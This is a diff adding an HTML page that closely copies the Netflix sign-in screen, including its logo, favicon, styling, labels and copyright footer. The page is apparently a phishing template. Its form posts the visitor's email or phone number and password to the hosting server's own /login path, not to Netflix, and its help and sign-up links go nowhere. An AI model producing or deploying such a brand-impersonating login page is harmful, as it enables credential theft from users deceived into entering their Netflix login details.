@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Netflix - Sign In</title>
+<link rel="icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.ico">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+@keyframes fadeIn{from{opacity:0}to{opacity:1}}
+@keyframes fadeInUp{from{opacity:0;transform:translateY(30px)}to{opacity:1;transform:translateY(0)}}
+@keyframes bgPan{0%{background-position:0% 50%}50%{background-position:100% 50%}100%{background-position:0% 50%}}
+@keyframes pulse{0%,100%{opacity:0.6}50%{opacity:1}}
+body{font-family:'Helvetica Neue',Helvetica,Arial,sans-serif;background:#000;min-height:100vh;position:relative;overflow:hidden}
+.bg{position:fixed;top:0;left:0;width:100%;height:100%;background:linear-gradient(135deg,#0a0a0a,#1a0a0a,#0a0a1a,#0a0a0a);background-size:300% 300%;animation:bgPan 10s ease infinite;z-index:0}
+.bg::after{content:'';position:absolute;top:0;left:0;right:0;bottom:0;background:radial-gradient(circle at 30% 40%,rgba(229,9,20,0.08) 0%,transparent 50%);animation:pulse 4s ease infinite}
+.header{position:relative;z-index:1;padding:24px 40px;animation:fadeIn 0.6s ease}
+.header svg{width:150px;height:40px}
+.container{position:relative;z-index:1;max-width:450px;margin:20px auto;padding:60px 68px 40px;background:rgba(0,0,0,0.75);backdrop-filter:blur(10px);border-radius:8px;border:1px solid rgba(255,255,255,0.05);animation:fadeInUp 0.8s cubic-bezier(0.16,1,0.3,1)}
+h1{font-size:32px;font-weight:700;color:#fff;margin-bottom:28px}
+.input-group{position:relative;margin-bottom:16px}
+.input-group input{width:100%;padding:24px 16px 8px;background:rgba(51,51,51,0.8);border:1px solid rgba(255,255,255,0.1);border-radius:6px;color:#fff;font-size:16px;outline:none;transition:all 0.3s}
+.input-group input:focus{background:rgba(69,69,69,0.9);border-color:rgba(255,255,255,0.3);box-shadow:0 0 0 2px rgba(229,9,20,0.2)}
+.input-group label{position:absolute;left:16px;top:50%;transform:translateY(-50%);color:#8c8c8c;font-size:16px;pointer-events:none;transition:all 0.3s}
+.input-group input:focus+label,.input-group input:not(:placeholder-shown)+label{top:14px;font-size:11px;color:#8c8c8c}
+.login-btn{width:100%;padding:16px;background:linear-gradient(135deg,#e50914,#b20710);color:white;border:none;border-radius:6px;font-size:16px;font-weight:600;cursor:pointer;margin-top:24px;transition:all 0.3s;position:relative;overflow:hidden}
+.login-btn:hover{background:linear-gradient(135deg,#f40612,#e50914);box-shadow:0 4px 20px rgba(229,9,20,0.4);transform:translateY(-2px)}
+.remember{display:flex;justify-content:space-between;align-items:center;margin-top:16px}
+.remember label{color:#b3b3b3;font-size:13px;display:flex;align-items:center;gap:4px;cursor:pointer}
+.remember a{color:#b3b3b3;font-size:13px;text-decoration:none}
+.help{margin-top:60px;color:#737373;font-size:16px}
+.help a{color:#fff;text-decoration:none}
+.footer{position:relative;z-index:1;max-width:1000px;margin:40px auto;padding:20px 68px;color:#737373;font-size:12px;animation:fadeIn 0.6s ease 0.6s both}
+@media(max-width:600px){.container{padding:40px 24px;margin:0 16px}}
+</style>
+</head>
+<body>
+<div class="bg"></div>
+<div class="header">
+    <svg viewBox="0 0 111 30"><path d="M105.062 14.28L111 30c-1.75-.25-3.499-.563-5.28-.845l-3.345-8.686-3.437 7.969c-1.687-.282-3.344-.376-5.031-.595l6.093-13.875L94.999 0H100.5l3.094 7.782L106.687 0h5.063l-6.688 14.28zM90.47 0l-4.033 27.968c-1.656-.157-3.312-.25-5-.344L85.5 0h4.97zM69.594 0v25.875c1.594-.094 3.156-.156 4.75-.156V4.312h5.594V0H69.594zM54.5 0v25.562c1.594 0 3.188.063 4.75.157V0H54.5z" fill="#e50914"/></svg>
+</div>
+<div class="container">
+    <h1>Sign In</h1>
+    <form action="/login" method="POST">
+        <div class="input-group">
+            <input type="text" name="email" id="email" placeholder=" " required>
+            <label for="email">Email or mobile number</label>
+        </div>
+        <div class="input-group">
+            <input type="password" name="password" id="password" placeholder=" " required>
+            <label for="password">Password</label>
+        </div>
+        <button type="submit" class="login-btn">Sign In</button>
+    </form>
+    <div class="remember">
+        <label><input type="checkbox" checked> Remember me</label>
+        <a href="#">Need help?</a>
+    </div>
+    <p class="help">New to Netflix? <a href="#">Sign up now</a>.</p>
+</div>
+<div class="footer"><a href="#" style="color:#737373;text-decoration:none">FAQ</a> · <a href="#" style="color:#737373;text-decoration:none">Help Centre</a> · <a href="#" style="color:#737373;text-decoration:none">Privacy</a><br><br>© 1997-2024 Netflix, Inc.</div>
+</body>
+</html>
